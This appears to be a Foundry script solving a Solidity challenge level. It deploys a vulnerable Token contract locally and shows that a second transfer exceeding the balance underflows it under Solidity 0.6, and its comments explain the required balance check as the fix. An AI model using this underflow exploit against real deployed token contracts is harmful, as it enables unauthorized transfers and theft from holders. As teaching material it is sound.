// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Token.sol";

contract Token_attack is Script{
    Token tokenContract;

    function setUp() public {}

    // The issue occurs due to an improper balance check in the transfer function.
    // When attempting to transfer more tokens than available in the sender's balance,
    // an underflow occurs, wrapping the balance to the maximum uint256 value, allowing unauthorized transfers.
    // To fix this, the balance check should use require(balances[msg.sender] >= _value). Or use solidity ^0.8.0 

    function run() public {
        
        vm.startPrank(address(1));
        tokenContract = new Token(1);
        tokenContract.transfer(address(2), 1);
        tokenContract.transfer(address(2), 1);
        uint256 balance = tokenContract.balanceOf(address(2));
        console.log(balance);
        

    }
}